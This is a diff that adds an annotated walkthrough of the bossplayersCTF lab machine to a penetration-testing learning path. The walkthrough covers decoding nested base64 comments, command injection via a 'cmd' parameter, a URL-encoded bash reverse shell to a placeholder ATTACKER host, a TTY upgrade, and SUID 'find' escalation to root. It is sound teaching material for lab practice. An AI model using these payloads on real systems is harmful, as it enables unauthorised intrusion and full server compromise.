@@ -200,4 +200,212 @@ build a shell command out of user input.
 
 ---
 
+## The commands, annotated — every input and every output
+
+### 1. Scan
+
+```bash
+sudo nmap -sC -sV -p- -T4 -oA scans/boss TARGET
+```
+
+```text
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: bossplayersCTF
+Service Info: OS: Linux
+```
+
+Two services, a modern Debian. Nothing unusual — so the entry point is in the **content**,
+not in a service version. That is the signal to stop looking at nmap and start reading HTML.
+
+### 2. Page source and the base64 chain
+
+```bash
+curl -s http://TARGET/ | grep -iE '<!--|base64|==' 
+```
+
+```text
+<!-- WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK -->
+<!-- ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K -->
+<!-- d29ya2luZ2lucHJvZ3Jlc3MucGhwCg== -->
+```
+
+`curl -s` prints raw HTML; `grep -iE` with `<!--` finds comments, which a browser never
+renders. **Three blobs, each base64** — recognisable by the `A–Z a–z 0–9 + /` character set
+and `=` padding. Peel them one at a time:
+
+```bash
+printf '%s' 'WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK' | base64 -d; echo
+printf '%s' 'ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K' | base64 -d; echo
+printf '%s' 'd29ya2luZ2lucHJvZ3Jlc3MucGhwCg==' | base64 -d; echo
+```
+
+```text
+ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K
+d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==
+workinginprogress.php
+```
+
+`printf '%s'` writes exactly those bytes; `echo` would prepend a newline before decoding and
+leave stray whitespace. **Each decode produced another base64 string except the last** — that
+is *nesting*, and the discipline is: decode, look at the result, ask whether it is itself
+encoded, repeat. The final value is a **filename on the web server**.
+
+### 3. The decoy, and how to know it is one
+
+```bash
+curl -s http://TARGET/robots.txt
+printf '%s' 'bG9sIHRyeSBoYXJkZXIgYnJvCg==' | base64 -d; echo
+```
+
+```text
+User-agent: *
+Disallow: /supersecretpassword.txt
+# bG9sIHRyeSBoYXJkZXIgYnJvCg==
+```
+```text
+lol try harder bro
+```
+
+`robots.txt` is a polite convention for crawlers and **is public by design** — so anything
+listed in it is published. Here the listed file and the decoded comment both mock you. You
+know it is a decoy because decoding it produces *no actionable artefact*: no path, no
+credential, no file that exists. **A real lead always resolves into something you can
+request or log in with.** Spend two minutes, note it in your report as an information leak
+(it still tells an attacker where the author thought secrets were), and move on.
+
+### 4. The injection point
+
+```bash
+curl -s "http://TARGET/workinginprogress.php"
+curl -s "http://TARGET/workinginprogress.php?cmd=id"
+```
+
+```text
+<h1>working in progress... come back later</h1>
+```
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+The page takes a `cmd` parameter and returns OS output. The PHP almost certainly does
+`system("ping " . $_GET['cmd'])` — **your input is concatenated into a shell command with no
+validation**, so whatever you put in `cmd` is executed. `uid=33(www-data)` confirms you are
+running as Apache's worker account: unprivileged, but on the server.
+
+Probe before committing to a payload:
+
+```bash
+curl -s "http://TARGET/workinginprogress.php?cmd=whoami"
+curl -s "http://TARGET/workinginprogress.php?cmd=uname -a"
+curl -s "http://TARGET/workinginprogress.php?cmd=ls -la /home"
+```
+
+`uname -a` gives the kernel (for later); `ls /home` gives usernames. Each is one HTTP request
+and each is a fact you will use.
+
+### 5. Reverse shell, URL-encoded
+
+```bash
+nc -lvnp 4444                                                  # ATTACKER, first
+curl "http://TARGET/workinginprogress.php?cmd=bash -c 'bash -i >%26 /dev/tcp/ATTACKER/4444 0>%261'"
+```
+
+```text
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.56.101:52114.
+www-data@boss:/var/www/html$
+```
+
+**The encoding is the part people get wrong.** In a URL query string, `&` separates
+parameters and `>` is reserved. `bash -i >& /dev/tcp/…` sent raw is truncated at the first
+`&`, so the server receives `cmd=bash -c 'bash -i >` and your shell never completes.
+`%26` is `&` and `%3E` is `>`, so the payload arrives intact. Generate it rather than typing
+it:
+
+```bash
+python3 -c "import urllib.parse as u; print(u.quote(\"bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'\"))"
+```
+
+Start the listener **first**: a one-shot payload that connects to nothing is consumed, and
+re-triggering it later appears to do nothing.
+
+### 6. Upgrade the TTY
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z  ->  back at your Kali prompt
+stty raw -echo; fg
+reset
+```
+
+A raw `nc` shell has no TTY: `sudo` will not prompt, `vi` is unusable, arrow keys print
+`^[[A`, and **`Ctrl+C` kills your listener** rather than the remote command. `pty.spawn`
+gives the remote bash a pseudo-terminal. `Ctrl+Z` suspends `nc` locally so you can run `stty`;
+`stty raw -echo` stops your *local* terminal from interpreting keystrokes, so the *remote*
+shell does it; `fg` resumes; `reset` fixes the remote terminal settings.
+
+### 7. SUID hunt and escape
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+ls -l /usr/bin/find
+```
+
+```text
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/find
+/usr/bin/newgrp
+```
+```text
+-rwsr-xr-x 1 root root 40288 Jan 10  2019 /usr/bin/find
+```
+
+`-perm -u=s` is the symbolic form of "the set-user-ID bit is set" (equivalent to `-perm
+-4000`). Everything except `/usr/bin/find` is stock. `-rwsr-xr-x` — note the **`s`** in the
+owner's execute position — means it runs with the **owner's** privileges, and the owner is
+`root`.
+
+```bash
+find . -exec /bin/sh -p \; -quit
+id
+```
+```text
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
+```
+
+`-exec CMD \;` runs `CMD` per match; `\;` is escaped so your shell does not eat the
+semicolon; `-quit` stops after the first match so you get one shell, not one per directory.
+**`-p` matters**: shells deliberately drop SUID privileges at startup as hardening, and `-p`
+("privileged") tells bash not to. Without it, `id` would show `uid=33` with no `euid=0` and
+you would think the escalation failed.
+
+### 8. The flag, which is itself encoded
+
+```bash
+cat /root/root.txt
+cat /root/root.txt | base64 -d
+```
+
+```text
+Y29uZ3JhdHVsYXRpb25zCg==
+```
+```text
+congratulations
+```
+
+The flag was **obfuscated, not protected** — which is exactly the lesson of the box. Once you
+are root, base64 is irrelevant; it protected nothing. Obfuscation only raises the cost for
+someone who already lacks the access it was meant to compensate for.
+
+---
+
 _Back to [Learning Path 1](../README.md) · previous: [Machine 5 — Kioptrix: Level 1](05-kioptrix-level-1-1.md) · next: [Machine 7 — Mr-Robot: 1](07-mr-robot-1.md) · full writeup: [`labs/3-016-bossplayersctf-1`](../../labs/3-016-bossplayersctf-1/README.md)._
